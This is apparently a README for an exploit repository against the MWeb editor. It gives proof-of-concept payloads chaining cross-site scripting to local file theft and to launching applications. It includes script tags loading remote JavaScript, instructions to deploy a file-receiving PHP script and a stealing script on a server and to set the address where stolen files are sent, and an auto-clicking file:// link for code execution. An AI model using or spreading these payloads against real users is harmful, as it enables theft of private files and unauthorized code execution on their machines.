# MWebXss2FileStealing&2RCE #

## The first vulnerability ##

XSS：

![xss](https://github.com/TheKingOfDuck/MWebXss2Rce/blob/master/images/xss.png)

POC：

```
<script src="//XssStage/ip.js"></script>
```


## The Second vulnerability ##

Xss2FileStealing

![file](https://github.com/TheKingOfDuck/MWebXss2Rce/blob/master/images/file.jpg)

php：https://github.com/TheKingOfDuck/MWebXss2Rce/blob/master/GetFile.php

（Deploy on the server）

jsEXP：https://github.com/TheKingOfDuck/MWebXss2Rce/blob/master/FileStealing.js

（Deploy on the server）

just like：

```
<script src="https://github.com/TheKingOfDuck/MWebXss2Rce/blob/master/FileStealing.js"></script>
```

Pay attention to modifying the acceptance address of the file（in FileStealing.js）

## The third vulnerability ##

Xss2RCE

![file](https://github.com/TheKingOfDuck/MWebXss2Rce/blob/master/images/rce.gif)

POC:

```
<a href="file:///Applications/Calculator.app" onclick="closewin();" id="alink">

<input id="btn" onclick="test()">   </input>

<script>
    document.getElementById("alink").click();
</script>
```



